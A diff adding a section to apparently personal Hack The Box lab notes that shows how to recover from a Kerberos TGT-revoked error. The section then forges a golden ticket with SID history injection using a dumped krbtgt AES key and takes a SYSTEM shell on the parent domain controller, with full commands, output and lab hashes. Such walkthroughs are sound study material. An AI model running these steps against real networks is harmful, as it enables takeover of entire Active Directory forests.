@@ -142,3 +142,73 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
+### KDC_ERR_TGT_REVOKED(TGT has been revoked)
+
+This error can occur when the domain controller rejects a forged Kerberos ticket during validation. A common cause is modern Kerberos hardening (e.g. updates like KB5021131), which enforce AES encryption and stricter ticket validation. Tools such as `raiseChild.py` may fail because they generate tickets using RC4 by default, which can be rejected by hardened environments.
+
+```bash
+gareth@gareth:~/htb/prolabs/trusted/test$ raiseChild.py -target-exec 172.16.20.221 lab.trusted.vl/garffff:Password123
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Raising child domain lab.trusted.vl
+[*] Forest FQDN is: trusted.vl
+[*] Raising lab.trusted.vl to trusted.vl
+[*] trusted.vl Enterprise Admin SID is: S-1-5-21-3576695518-347000760-3731839591-519
+[*] Getting credentials for lab.trusted.vl
+lab.trusted.vl/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c7a03c565c68c6fac5f8913fab576ebd:::
+lab.trusted.vl/krbtgt:aes256-cts-hmac-sha1-96s:c930ddb15c3f84aafa01e816abc1112e38430b574ae3fcdd019e77bc906494aa
+[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)
+```
+
+The fix, first use secretsdump on the child domain, and get the AES256 key for `krbtgt`:
+
+```bash
+krbtgt:aes256-cts-hmac-sha1-96:c930ddb15c3f84aafa01e816abc1112e38430b574ae3fcdd019e77bc906494aa
+```
+
+Use `lookupsid.py` to look for the SIDs of both the child and parents domains.
+
+Forged a Golden Ticket for the child domain and use SID History injection to escalate to the parent domain.
+
+```bash
+ticketer.py -aesKey <child_krbtgt_aes256_key> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <parent_domain_sid>-519 <target_user>
+```
+
+Example:
+
+```bash
+garffff@garffff:~/htb/prolabs/trusted/test/1$ ticketer.py -aesKey c930ddb15c3f84aafa01e816abc1112e38430b574ae3fcdd019e77bc906494aa -domain lab.trusted.vl -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 Administrator
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for lab.trusted.vl/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in Administrator.ccache
+
+garffff@garffff:~/htb/prolabs/trusted/test/1$ export KRB5CCNAME=Administrator.ccache
+
+garffff@garffff:~/htb/prolabs/trusted/test/1$ psexec.py lab.trusted.vl/Administrator@TRUSTEDDC.trusted.vl -k -no-pass
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on TRUSTEDDC.trusted.vl.....
+[*] Found writable share ADMIN$
+[*] Uploading file alXoNTkb.exe
+[*] Opening SVCManager on TRUSTEDDC.trusted.vl.....
+[*] Creating service AYzy on TRUSTEDDC.trusted.vl.....
+[*] Starting service AYzy.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.4297]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32> 
+```
+
+
